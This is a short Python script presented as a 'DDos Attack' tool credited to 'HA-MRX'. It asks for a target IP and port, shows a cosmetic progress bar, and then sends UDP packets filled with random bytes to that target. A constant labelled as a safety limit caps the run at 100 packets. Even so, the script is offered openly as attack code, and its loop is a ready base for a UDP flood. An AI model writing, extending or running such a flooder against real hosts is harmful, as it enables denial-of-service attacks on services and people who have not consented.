import sys
import os
import time
import socket
import random
from datetime import datetime

MAX_PACKETS = 100  # 安全限制

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random.randbytes(1490) if hasattr(random, 'randbytes') else os.urandom(1490)

os.system("cls" if os.name == "nt" else "clear")
if os.system("which figlet > /dev/null 2>&1") == 0:
    os.system("figlet DDos Attack")
else:
    print("DDos Attack")
print("Author    : HA-MRX")
print("github    : https://github.com/Ha3MrX")
print("")

while True:
    ip = input("IP Target : ")
    try:
        socket.inet_aton(ip)
        break
    except socket.error:
        print("Invalid IP address")

while True:
    try:
        port = int(input("Port       : "))
        if 1 <= port <= 65535:
            break
        print("Port must be between 1-65535")
    except ValueError:
        print("Invalid port number")

os.system("cls" if os.name == "nt" else "clear")
if os.system("which figlet > /dev/null 2>&1") == 0:
    os.system("figlet Attack Starting")
else:
    print("Attack Starting")
print("[                    ] 0% ")
time.sleep(2)
print("[=====               ] 25%")
time.sleep(2)
print("[==========          ] 50%")
time.sleep(2)
print("[===============     ] 75%")
time.sleep(2)
print("[====================] 100%")
time.sleep(1)

sent = 0
try:
    for _ in range(MAX_PACKETS):
        sock.sendto(bytes, (ip, port))
        sent += 1
        print(f"Sent {sent} packet to {ip} through port:{port}")
        time.sleep(0.1)
except KeyboardInterrupt:
    print("\n[!] Stopped by user")
    sys.exit()
except Exception as e:
    print(f"\n[!] Error: {e}")
    sys.exit()
